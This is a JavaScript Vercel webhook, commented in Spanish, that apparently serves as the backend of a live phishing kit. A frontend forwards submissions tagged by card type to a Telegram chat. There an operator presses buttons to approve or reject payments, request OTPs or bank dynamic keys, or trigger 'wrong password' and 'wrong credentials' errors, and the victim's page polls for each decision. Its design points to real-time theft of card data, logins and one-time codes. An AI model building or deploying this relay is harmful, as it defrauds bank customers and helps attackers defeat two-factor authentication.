// api/webhook.js - WEBHOOK COMPLETO PARA VERCEL (SIN package.json)

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Almacenamiento en memoria (se mantiene entre peticiones en Vercel)
if (!global.solicitudes) {
    global.solicitudes = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Verificar variables de entorno
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Variables de entorno no configuradas');
        return res.status(500).json({ 
            error: 'Configuración incompleta',
            mensaje: 'Faltan TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID'
        });
    }

    // ============================================
    // GET - Configurar webhook o consultar estado
    // ============================================
    if (req.method === 'GET') {
        const { check, setup, info } = req.query;

        // CONFIGURAR WEBHOOK
        if (setup === 'true') {
            try {
                const protocol = req.headers['x-forwarded-proto'] || 'https';
                const host = req.headers.host;
                const webhookUrl = `${protocol}://${host}/api/webhook`;
                
                console.log('🔗 Configurando webhook en:', webhookUrl);

                // Eliminar webhook anterior
                await fetch(`${TELEGRAM_API}/deleteWebhook`);
                
                // Configurar nuevo webhook
                const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                console.log('✅ Webhook configurado:', data);

                return res.status(200).json({
                    success: true,
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ 
                    error: 'Error configurando webhook',
                    detalle: error.message
                });
            }
        }

        // VERIFICAR ESTADO DE UNA SOLICITUD
        if (check) {
            const solicitud = global.solicitudes.get(check);
            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: solicitud.estado || 'pending',
                    timestamp: solicitud.timestamp
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: 'pending'
                });
            }
        }

        // OBTENER INFO DEL WEBHOOK
        if (info === 'true') {
            try {
                const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
                const data = await response.json();
                return res.status(200).json(data);
            } catch (error) {
                return res.status(500).json({ 
                    error: 'Error obteniendo info del webhook',
                    detalle: error.message
                });
            }
        }

        // Respuesta por defecto para GET
        return res.status(200).json({
            mensaje: 'Webhook de Telegram funcionando',
            endpoints: {
                POST: 'Recibe mensajes del frontend y callbacks de Telegram',
                GET: {
                    '?setup=true': 'Configura el webhook en Telegram',
                    '?check=ID': 'Verifica estado de una solicitud',
                    '?info=true': 'Obtiene información del webhook'
                }
            }
        });
    }

    // ============================================
    // POST - Recibe mensajes
    // ============================================
    if (req.method === 'POST') {
        try {
            const body = req.body;
            console.log('📨 POST recibido');

            // ============================================
            // CASO 1: Frontend envía mensaje para Telegram
            // ============================================
            if (body.mensaje && body.solicitudId) {
                console.log('📨 Enviando a Telegram - Solicitud:', body.solicitudId);
                console.log('📝 Tipo tarjeta:', body.tipoTarjeta || 'N/A');
                
                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: body.mensaje,
                        parse_mode: 'Markdown',
                        reply_markup: body.botones,
                        disable_web_page_preview: true
                    })
                });

                const data = await response.json();
                console.log('📨 Respuesta de Telegram:', data.ok ? '✅ OK' : '❌ Error');

                if (data.ok) {
                    global.solicitudes.set(body.solicitudId, {
                        estado: 'pending',
                        timestamp: Date.now()
                    });
                    
                    return res.status(200).json({ 
                        success: true,
                        messageId: data.result.message_id,
                        solicitudId: body.solicitudId
                    });
                } else {
                    console.error('❌ Error Telegram:', data.description);
                    return res.status(500).json({ 
                        success: false, 
                        error: data.description 
                    });
                }
            }

            // ============================================
            // CASO 2: Botón presionado en Telegram (callback_query)
            // ============================================
            if (body.callback_query) {
                const callbackData = body.callback_query.data;
                const callbackId = body.callback_query.id;
                const message = body.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                let action = '';
                let solicitudId = '';
                let respuestaTexto = '';
                let estadoMensaje = '';

                // ============================================
                // PROCESAR DIFERENTES TIPOS DE CALLBACKS
                // ============================================
                
                // --- APROBAR/RECHAZAR SIMPLE (sin tipo de tarjeta) ---
                if (callbackData.startsWith('approve_') && 
                    !callbackData.includes('_visa_') && 
                    !callbackData.includes('_master_') && 
                    !callbackData.includes('_amex_') &&
                    !callbackData.includes('_otp_') &&
                    !callbackData.includes('_clave_din_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - Redirigiendo al cliente';
                }
                else if (callbackData.startsWith('reject_') && 
                         !callbackData.includes('_visa_') && 
                         !callbackData.includes('_master_') && 
                         !callbackData.includes('_amex_') &&
                         !callbackData.includes('_otp_') &&
                         !callbackData.includes('_clave_din_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                }

                // --- VISA ---
                else if (callbackData.startsWith('approve_visa_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_visa_', '');
                    respuestaTexto = '✅ Pago aprobado (Visa)';
                    estadoMensaje = '✅ *APROBADO* - Redirigiendo a Visa';
                }
                else if (callbackData.startsWith('reject_visa_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_visa_', '');
                    respuestaTexto = '❌ Pago rechazado (Visa)';
                    estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                }

                // --- MASTERCARD ---
                else if (callbackData.startsWith('approve_master_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_master_', '');
                    respuestaTexto = '✅ Pago aprobado (Mastercard)';
                    estadoMensaje = '✅ *APROBADO* - Redirigiendo a Mastercard';
                }
                else if (callbackData.startsWith('reject_master_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_master_', '');
                    respuestaTexto = '❌ Pago rechazado (Mastercard)';
                    estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                }

                // --- AMEX ---
                else if (callbackData.startsWith('approve_amex_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_amex_', '');
                    respuestaTexto = '✅ Pago aprobado (Amex)';
                    estadoMensaje = '✅ *APROBADO* - Redirigiendo a Amex';
                }
                else if (callbackData.startsWith('reject_amex_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_amex_', '');
                    respuestaTexto = '❌ Pago rechazado (Amex)';
                    estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                }

                // --- OTP (Visa Verified) ---
                else if (callbackData.startsWith('aprobar_otp_')) {
                    action = 'aprobar_otp';
                    solicitudId = callbackData.replace('aprobar_otp_', '');
                    respuestaTexto = '✅ OTP aprobado';
                    estadoMensaje = '✅ *OTP APROBADO*';
                }
                else if (callbackData.startsWith('rechazar_otp_')) {
                    action = 'rechazar_otp';
                    solicitudId = callbackData.replace('rechazar_otp_', '');
                    respuestaTexto = '❌ OTP rechazado';
                    estadoMensaje = '❌ *OTP RECHAZADO*';
                }
                else if (callbackData.startsWith('pedir_otp_')) {
                    action = 'pedir_otp';
                    solicitudId = callbackData.replace('pedir_otp_', '');
                    respuestaTexto = '📱 Código OTP solicitado';
                    estadoMensaje = '📱 *OTP SOLICITADO*';
                }

                // --- CLAVE DINÁMICA ---
                else if (callbackData.startsWith('aprobar_clave_din_')) {
                    action = 'aprobar_clave_din';
                    solicitudId = callbackData.replace('aprobar_clave_din_', '');
                    respuestaTexto = '✅ Clave Dinámica aprobada';
                    estadoMensaje = '✅ *CLAVE DINÁMICA APROBADA*';
                }
                else if (callbackData.startsWith('rechazar_clave_din_')) {
                    action = 'rechazar_clave_din';
                    solicitudId = callbackData.replace('rechazar_clave_din_', '');
                    respuestaTexto = '❌ Clave Dinámica rechazada';
                    estadoMensaje = '❌ *CLAVE DINÁMICA RECHAZADA*';
                }
                else if (callbackData.startsWith('pedir_clave_din_')) {
                    action = 'pedir_clave_din';
                    solicitudId = callbackData.replace('pedir_clave_din_', '');
                    respuestaTexto = '🔑 Clave Dinámica solicitada';
                    estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA*';
                }

                // --- ERRORES ---
                else if (callbackData.startsWith('error_user_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_', '');
                    respuestaTexto = '❌ Error de usuario';
                    estadoMensaje = '❌ *ERROR USUARIO*';
                }
                else if (callbackData.startsWith('error_pass_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_', '');
                    respuestaTexto = '❌ Error de contraseña';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA*';
                }
                else if (callbackData.startsWith('error_otp_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_', '');
                    respuestaTexto = '❌ Error de OTP';
                    estadoMensaje = '❌ *ERROR OTP*';
                }
                else if (callbackData.startsWith('error_credenciales_')) {
                    action = 'error_credenciales';
                    solicitudId = callbackData.replace('error_credenciales_', '');
                    respuestaTexto = '❌ Credenciales incorrectas';
                    estadoMensaje = '❌ *ERROR CREDENCIALES*';
                }

                // --- FALLBACK ---
                else {
                    const parts = callbackData.split('_');
                    action = parts[0] || 'unknown';
                    solicitudId = parts.slice(1).join('_') || 'unknown';
                    respuestaTexto = 'Procesado';
                    estadoMensaje = '⚠️ Procesado';
                    console.log('⚠️ Callback no reconocido:', callbackData);
                }

                console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

                // ============================================
                // RESPONDER AL CALLBACK QUERY
                // ============================================
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuestaTexto,
                        show_alert: false
                    })
                });

                // ============================================
                // ACTUALIZAR MENSAJE EN TELEGRAM
                // ============================================
                let newText = originalText;
                const estadoRegex = /⏳ \*Estado:\* .+/;
                if (estadoRegex.test(newText)) {
                    newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMensaje}`);
                } else {
                    newText += `\n\n⏳ *Estado:* ${estadoMensaje}`;
                }

                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                // ============================================
                // GUARDAR ESTADO DE LA SOLICITUD
                // ============================================
                global.solicitudes.set(solicitudId, {
                    estado: action,
                    timestamp: Date.now()
                });

                console.log(`✅ Solicitud ${solicitudId}: ${action}`);

                return res.status(200).json({ 
                    success: true, 
                    action: action,
                    solicitudId: solicitudId
                });
            }

            // ============================================
            // CASO 3: Otros tipos de mensajes
            // ============================================
            console.log('📨 Otro tipo de mensaje:', Object.keys(body));
            return res.status(200).json({ 
                success: true, 
                mensaje: 'Mensaje recibido pero no procesado'
            });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ 
                error: 'Error interno del servidor',
                detalle: error.message
            });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
